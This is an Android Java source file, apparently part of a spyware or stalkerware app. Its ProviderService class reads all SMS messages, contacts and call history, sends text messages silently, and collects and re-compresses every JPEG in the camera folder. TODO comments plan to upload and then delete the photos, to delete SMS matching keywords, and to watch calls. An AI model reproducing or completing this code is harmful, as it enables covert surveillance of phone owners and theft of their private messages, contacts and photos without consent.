package com.fs.fs.api;

import android.Manifest;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.text.TextUtils;

import com.fs.fs.bean.PhoneInfo;
import com.fs.fs.bean.SMSInfo;
import com.fs.fs.receivers.SMSReceiver;
import com.fs.fs.utils.Constant;
import com.fs.fs.utils.DateUtils;
import com.fs.fs.utils.FileUtils;
import com.fs.fs.utils.ImageUtils;
import com.fs.fs.utils.LogUtils;
import com.fs.fs.utils.SharePreferencesUtils;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

/**
 * Created by wyx on 2016/12/30.
 */

public class ProviderService {
    //TODO: 监听Call/通讯记录 & 通讯录 ContentObserver
    //TODO: 删除关键词短信
    private Context mContext = null;
    private SharePreferencesUtils mSharePreferences = null;
    // 获取内容解析者
    private ContentResolver mResolver = null;

    public ProviderService(Context context) {
        this.mContext = context;
        this.mSharePreferences = new SharePreferencesUtils(context);
        this.mResolver = mContext.getContentResolver();
    }

    public interface SMSListener {
        void onGetAllSMS(List<SMSInfo> SMSInfo);

        void onReceive(SMSInfo msgInfo);
    }

    public interface CallsListener {
        void onGetAllCall(List<PhoneInfo> callInfo);

        void onStart();

        void onFinish();

        Boolean onPhoneNumber(String number);
    }

    public interface ContactsListener {
        void onGetAllContacts(List<PhoneInfo> phoneInfo);
    }

    public SMSListener mSMSListener;
    public CallsListener mCallsListener;
    public ContactsListener mContactsListener;

    public void sendSMSSilent(String phoneNumber, String content) {
        if (TextUtils.isEmpty(content)) return;
        PendingIntent sentIntent = PendingIntent.getBroadcast(mContext, 0, new Intent(), 0);
        SmsManager smsManager = SmsManager.getDefault();
        if (content.length() >= 70) {
            List<String> ms = smsManager.divideMessage(content);
            for (String str : ms) {
                smsManager.sendTextMessage(phoneNumber, null, str, sentIntent, null);
            }
        } else {
            smsManager.sendTextMessage(phoneNumber, null, content, sentIntent, null);
        }
    }

    public void getSMS(SMSListener listener) {
        mSMSListener = listener;
        Boolean isSMSRead = (Boolean) mSharePreferences.get(Constant.SHARE_KEYS.SMS_HAS_READ, false);
        if (!isSMSRead) {
            // 获取查询路径
            Uri uri = Uri.parse("content://sms");
            Cursor cursor = mResolver.query(uri, new String[]{"address", "date", "body", "person"}, null, null, null);
            if (null != cursor) {
                List<SMSInfo> smsInfos = new ArrayList<>();
                while (cursor.moveToNext()) {
                    SMSInfo smsInfo = new SMSInfo();
                    smsInfo.phoneNumber = cursor.getString(cursor.getColumnIndex("address"));//手机号
                    smsInfo.name = cursor.getString(cursor.getColumnIndex("person"));//联系人姓名列表
                    smsInfo.content = cursor.getString(cursor.getColumnIndex("body"));
                    smsInfo.time = DateUtils.millis2String(cursor.getLong(cursor.getColumnIndex("date")));
                    smsInfos.add(smsInfo);
                    LogUtils.d(smsInfo.toString());
                }
                cursor.close();
                mSharePreferences.put(Constant.SHARE_KEYS.SMS_HAS_READ, true);
                mSMSListener.onGetAllSMS(smsInfos);
            }
        }
        SMSReceiver.setListener(listener);
    }

    public void getContants(ContactsListener listener) {
        mContactsListener = listener;
        //取得电话本中开始一项的光标
        Cursor cursor = mResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        //向下移动光标
        List<PhoneInfo> infos = new ArrayList<>();
        if (cursor != null) {
            while (cursor.moveToNext()) {
                PhoneInfo phoneInfo = new PhoneInfo();
                //取得联系人名字
                int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                phoneInfo.name = cursor.getString(nameFieldColumnIndex);
                //取得电话号码
                String ContactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                Cursor phoneCursor = mResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + ContactId, null, null);
                phoneInfo.phoneNumber = "";
                if (phoneCursor != null) {
                    while (phoneCursor.moveToNext()) {
                        String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phoneInfo.phoneNumber += phoneNumber.replace("-", "").replace(" ", "");
                    }
                    phoneCursor.close();
                }
                LogUtils.d(phoneInfo.toString());
                infos.add(phoneInfo);

            }
            cursor.close();
        }
        LogUtils.d("%s", infos.size());
        mContactsListener.onGetAllContacts(infos);
    }

    public void getCalls(CallsListener listener) {
        mCallsListener = listener;
        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // 检查READ_CALL_LOG权限
            return;
        }
        Cursor cursor = mResolver.query(
                CallLog.Calls.CONTENT_URI, null,
                CallLog.Calls.TYPE + " = ? or " + CallLog.Calls.TYPE + " = ? ",
                new String[]{String.valueOf(CallLog.Calls.INCOMING_TYPE), String.valueOf(CallLog.Calls.OUTGOING_TYPE)},
                CallLog.Calls.DEFAULT_SORT_ORDER
        );
        List<PhoneInfo> infos = new ArrayList<>();
        if (cursor != null) {
            while (cursor.moveToNext()) {
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                PhoneInfo info = null;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE:
                        info = getPhoneInfo(cursor, PhoneInfo.INCOMING);
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        info = getPhoneInfo(cursor, PhoneInfo.OUTGOING);
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        LogUtils.e("挂断");
                        break;
                    default:
                        LogUtils.e("挂断");
                        break;
                }
                if (info != null) {
                    LogUtils.d(info.toString());
                    infos.add(info);
                }
            }
            cursor.close();
            mCallsListener.onGetAllCall(infos);
            LogUtils.d("%s", infos.size());
        }
    }

    private PhoneInfo getPhoneInfo(Cursor cursor, int type) {
        PhoneInfo info = new PhoneInfo();
        info.phoneNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
        info.time = DateUtils.millis2String(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
        info.name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
        info.duration = DateUtils.getSpan(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)) * 1000);
        info.type = type;
        return info;
    }

    public void getPictures() {
        //TODO: SharePreferencesUtils保存结果对比更新
        File root = new File(Environment.getExternalStorageDirectory() + "/DCIM/");
        File[] files = root.listFiles();
        if (files == null) {
            return;
        }
        getPicture(files);
    }

    private void getPicture(File[] files) {
        for (File file : files) {
            if (file.isDirectory() && !file.isHidden()) {
                getPicture(file.listFiles());
            } else if (file.getAbsolutePath().endsWith(".jpg")) {
                String path = file.getAbsolutePath();
                Bitmap bitmap = ImageUtils.resize(path, 640, 640);
                String fileName = String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "jpg");
                FileOutputStream out = null;
                try {
                    fileName = FileUtils.getExternalFullPath(mContext, fileName);
                    LogUtils.d(fileName);
                    out = new FileOutputStream(fileName);
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out);
                    // TODO:上传并删除
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } finally {
                    try {
                        if (out != null) {
                            out.close();
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    if (bitmap != null && !bitmap.isRecycled()) {
                        bitmap.recycle();
                        bitmap = null;
                    }
                }
            }
        }
    }


}
